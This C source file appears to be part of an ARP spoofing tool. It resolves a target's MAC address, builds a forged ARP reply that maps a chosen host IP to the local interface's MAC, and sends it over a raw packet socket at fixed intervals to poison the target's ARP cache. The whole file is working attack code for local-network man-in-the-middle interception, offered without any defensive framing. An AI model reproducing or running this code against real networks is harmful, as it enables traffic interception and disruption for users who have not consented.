#include "arp.h"
#include "arpspoof.h"


int mac_from_iface(const char* iface_name, struct ether_addr* ether_out)
{
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock < 0) {
		perror("[!] Failed at socket mac_from_iface");
		return -1;
	}

	struct ifreq ifr;
	memset((void*) &ifr, 0, sizeof(ifr));

	strncpy(ifr.ifr_name, iface_name, sizeof(ifr.ifr_name));

	if (ioctl(sock, SIOCGIFHWADDR, (void*) &ifr) < 0) {
		perror("[!] Failed at ioctl mac_from_iface");
		return -1;
	}

	memcpy(ether_out->ether_addr_octet, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	return 1;
}

int arpspoof(const char *ifname, const char *target, const char *host, int cnt)
{

	int interval = 2;

	struct ether_addr iface_hwaddr;
	if (mac_from_iface(ifname, &iface_hwaddr) < 0) {
		return -1;
	}

	struct ether_addr target_hwaddr;
	if (find_mac_addr(inet_addr(target), ifname, &target_hwaddr) < 0) {
		return -1;
	}

	char sendr_mac[18]; 
	char target_mac[18];

	memset(sendr_mac, 0, sizeof(sendr_mac));
	memset(target_mac, 0, sizeof(target_mac));

	strncpy(sendr_mac, ether_ntoa(&iface_hwaddr), sizeof(sendr_mac));
	strncpy(target_mac, ether_ntoa(&target_hwaddr), sizeof(target_mac));

	struct arp_packet* arp = create_arp_reply_packet(sendr_mac, host,
													 target_mac, target);
	
	int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0) {
		perror("[!] Failed at socket arpspoof");
		return -1;
	}

	int if_idx = if_nametoindex(ifname);
	if (if_idx == 0) {
		perror("[!] Failed at if_nametoindex arpspoof");
		return -1;
	}

	// printf("Interval: per %ds\n", interval);
	int i=0;
	do {
		if (send_arp_to(arp, sock, if_idx) > 0) {
			//printf("send ARP Reply: %s is at %s --to-> %s\n", host, sendr_mac, target);
		}
		i++;
		sleep(interval);
	} while(i < cnt);

	return 0;
}
